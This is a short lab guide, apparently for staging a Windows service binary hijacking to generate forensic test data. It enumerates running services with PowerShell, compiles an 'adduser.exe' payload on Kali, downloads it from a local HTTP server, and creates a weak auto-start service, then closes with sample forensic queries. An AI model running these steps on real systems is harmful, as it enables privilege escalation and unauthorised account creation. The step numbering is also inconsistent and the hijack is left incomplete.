# Steps to fabricate attack(safe) on Windows
This document denotes how we can fabricate a plausible attack on a Windows machine.

We demonstrate a Windows service binary hijacking(that is benign in nature).

## Step 1: Enumeration
### Open PowerShell and key in this command to look at which services are running to determine what to hijack
``` Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running'} ``` 
#### We want to obtain a binary that is not located in C:\\WINDOWS\\sys32

## Step 2: Create malicious binary in Kali Linux: 
### Create and compile binary: 
``` x86_64-w64-mingw32-gcc adduser.c -o adduser.exe ```
### Start web server in same directory as binary created:
``` python3 -m http.server``` 
### Download on Windows client (PowerShell):
```iwr -uri http://192.168.75.130:8000/adduser.exe -Outfile adduser.exe```

## Step 2
### Open PowerShell as administrator and run the following command:
``` sc.exe create WeakService binPath= "C:\Temp\WeakService\goodservice.exe" start= auto ``` 


e.g 

`can you give me all network connections on MACHINENAME and look for suspicious processes?`

`can you tell me which artifacts target the USN journal` 